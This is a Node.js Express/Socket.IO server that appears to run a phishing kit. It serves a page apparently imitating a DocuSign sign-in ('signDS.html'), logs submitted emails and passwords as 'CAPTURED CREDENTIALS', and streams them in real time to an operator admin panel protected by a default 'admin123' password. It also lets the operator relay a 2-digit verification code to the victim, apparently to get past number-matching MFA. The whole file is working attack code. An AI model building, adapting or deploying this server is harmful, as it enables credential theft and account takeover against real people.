const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Password for Admin access
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "admin123";

// In-memory store for captured credentials
let latestCredentials = null;

// Protect admin.html with HTTP Basic Auth
app.get('/admin.html', (req, res, next) => {
  const auth = { login: 'admin', password: ADMIN_PASSWORD };
  const b64auth = (req.headers.authorization || '').split(' ')[1] || '';
  const [login, password] = Buffer.from(b64auth, 'base64').toString().split(':');

  if (login === auth.login && password === auth.password) {
    return next();
  }

  res.set('WWW-Authenticate', 'Basic realm="Admin Access Required"');
  res.status(401).send('Authentication required.');
});

// Serve public static files
app.use(express.static(path.join(__dirname, 'public')));

// Set signDS.html as default home page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'signDS.html'));
});

// Socket.IO real-time connection logic
io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);

  // If credentials already exist in memory, send them immediately to newly connected admins
  if (latestCredentials) {
    socket.emit('admin_receive_credentials', latestCredentials);
  }

  // Listen for email and password submitted by the user
  socket.on('user_submitted_credentials', (data) => {
    console.log('>>> CAPTURED CREDENTIALS:', data);
    latestCredentials = data; // Save to server memory
    io.emit('admin_receive_credentials', data); // Broadcast to all admins
  });

  // Handle admin sending 2-digit verification code
  socket.on('admin_send_code', (data) => {
    io.emit('user_receive_code', { code: data.code });
  });

  socket.on('disconnect', () => {
    console.log('Client disconnected');
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running at http://localhost:${PORT}`));